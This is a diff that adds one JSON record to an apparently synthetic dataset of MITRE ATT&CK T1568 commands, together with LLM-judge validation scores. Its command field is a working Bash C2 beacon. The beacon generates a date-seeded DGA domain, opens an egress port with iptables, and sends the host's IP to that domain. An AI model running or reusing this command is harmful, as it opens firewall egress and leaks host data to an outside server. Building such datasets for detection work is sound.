@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "FQDN=$(python3 - <<'EOF'\nimport hashlib, time\ns=\"beta\"+time.strftime(\"%Y%m%d\")\nprint(hashlib.sha1(s.encode()).hexdigest()[:10]+\".telemetry-cache.net\")\nEOF\n); PORT=$(shuf -e 8443 2052 2087 -n1); iptables -A OUTPUT -p tcp --dport ${PORT} -j ACCEPT; IP=$(getent hosts \"$FQDN\" | awk '{print $1}' | shuf -n1); [ -n \"$IP\" ] && curl --fail --silent --show-error --resolve \"${FQDN}:${PORT}:${IP}\" \"https://${FQDN}:${PORT}/c2/ping?i=$(hostname -I | awk '{print $1}')\"",
+  "explanation": "Uses a Python one-liner DGA to derive a hostname, resolves it via system NSS, and pins the curl connection to the returned IP with --resolve on a nonstandard port.",
+  "rationale_steps": [
+    "Generate DGA hostname using date-based seed",
+    "Open egress for chosen uncommon TLS port",
+    "Resolve hostname dynamically via getent",
+    "Establish C2 check-in bound to resolved IP"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-3cc49009",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct syntax for Python heredoc, variable assignment, and command chaining.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by using a deterministic DGA algorithm to generate a domain name based on date, selecting random ports, resolving the domain to an IP, and establishing C2 communication with proper error handling.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:09:03.976764Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, correct command substitutions, valid flag formats, and proper command separators throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of using DGA for hostname, dynamic port selection, resolving via NSS, and pinning the curl connection for C2 beaconing, directly aligning with T1568 (Dynamic Resolution) techniques despite the iptables command potentially failing due to insufficient privileges, which is not central to the T1568 technique itself or explicitly claimed in the explanation.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:09:29.059767Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting with a correctly delimited here-doc inside command substitution, valid separators and flags, and no parse errors.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements a date-based DGA to generate a hostname, resolves it, and connects with curl using --resolve and rotating ports consistent with T1568, though the iptables step requires root and may fail non-fatally under the declared no-privilege context.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:09:40.560920Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
